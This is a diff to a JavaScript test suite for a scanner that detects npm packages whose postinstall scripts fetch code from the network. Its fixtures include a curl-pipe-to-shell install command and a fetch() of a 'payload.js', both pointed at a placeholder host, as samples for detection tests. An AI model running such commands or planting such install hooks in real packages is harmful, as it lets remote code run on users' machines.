@@ -119,9 +119,10 @@ test('reports npm packages whose postinstall script invokes curl', async () => {
     script: 'postinstall',
     command: 'curl -fsSL https://example.invalid/install.sh | sh',
     evidenceFiles: [],
+    indicators: ['curl'],
     locations: ['npm global'],
     sources: [path.join(pkgRoot, 'package.json').replace(os.homedir(), '~')],
-    reason: 'postinstall script invokes curl',
+    reason: 'postinstall script has network-fetch behavior',
   }]);
 });
 
@@ -148,7 +149,33 @@ test('reports npm packages whose postinstall script points at a local file that 
   assert.equal(result.suspiciousScripts[0].name, 'risky-file-fetch');
   assert.equal(result.suspiciousScripts[0].command, 'node scripts/install.js');
   assert.deepEqual(result.suspiciousScripts[0].evidenceFiles, [path.join(pkgRoot, 'scripts', 'install.js').replace(os.homedir(), '~')]);
-  assert.equal(result.suspiciousScripts[0].reason, 'postinstall script references a local file that invokes curl');
+  assert.deepEqual(result.suspiciousScripts[0].indicators, ['curl']);
+  assert.equal(result.suspiciousScripts[0].reason, 'postinstall script references a local file with network-fetch behavior');
+});
+
+test('reports npm packages whose postinstall script points at a local file that uses fetch', async () => {
+  const root = makeTempRepo();
+  const modulesRoot = path.join(root, 'node_modules');
+  const pkgRoot = path.join(modulesRoot, 'risky-fetch-api');
+  fs.mkdirSync(path.join(pkgRoot, 'scripts'), { recursive: true });
+  writeJson(path.join(pkgRoot, 'package.json'), {
+    name: 'risky-fetch-api',
+    version: '1.0.0',
+    scripts: {
+      postinstall: 'node scripts/install.mjs',
+    },
+  });
+  fs.writeFileSync(path.join(pkgRoot, 'scripts', 'install.mjs'), 'await fetch("https://example.invalid/payload.js")');
+
+  const result = await scanMachine({
+    live: false,
+    locations: [{ label: 'npm global', kind: 'node_modules', path: modulesRoot }],
+  });
+
+  assert.equal(result.suspiciousScripts.length, 1);
+  assert.equal(result.suspiciousScripts[0].name, 'risky-fetch-api');
+  assert.deepEqual(result.suspiciousScripts[0].evidenceFiles, [path.join(pkgRoot, 'scripts', 'install.mjs').replace(os.homedir(), '~')]);
+  assert.deepEqual(result.suspiciousScripts[0].indicators, ['fetch']);
 });
 
 test('does not report curl mentions outside postinstall', async () => {
@@ -306,7 +333,7 @@ test('rejects path arguments because the command is machine-only', () => {
   assert.throws(() => parseArgs(['.']), /always scans this machine/);
 });
 
-test('formats human report with postinstall curl packages', () => {
+test('formats human report with postinstall network-fetch packages', () => {
   const report = formatResult({
     machine: 'test-machine',
     home: '/tmp/home',
@@ -321,16 +348,17 @@ test('formats human report with postinstall curl packages', () => {
       script: 'postinstall',
       command: 'curl -fsSL https://example.invalid/install.sh | sh',
       evidenceFiles: [],
+      indicators: ['curl'],
       locations: ['npm global'],
       sources: ['/tmp/node_modules/risky-fetch/package.json'],
-      reason: 'postinstall script invokes curl',
+      reason: 'postinstall script has network-fetch behavior',
     }],
     snapshotDate: '2026-05-12',
     advisoryArtifactCount: 438,
   }, { color: false, interactive: false });
 
   assert.match(report, /install-script hit/);
-  assert.match(report, /Packages with postinstall curl/);
+  assert.match(report, /Packages with postinstall network fetch/);
   assert.match(report, /risky-fetch@1\.0\.0/);
   assert.match(report, /curl -fsSL/);
 });
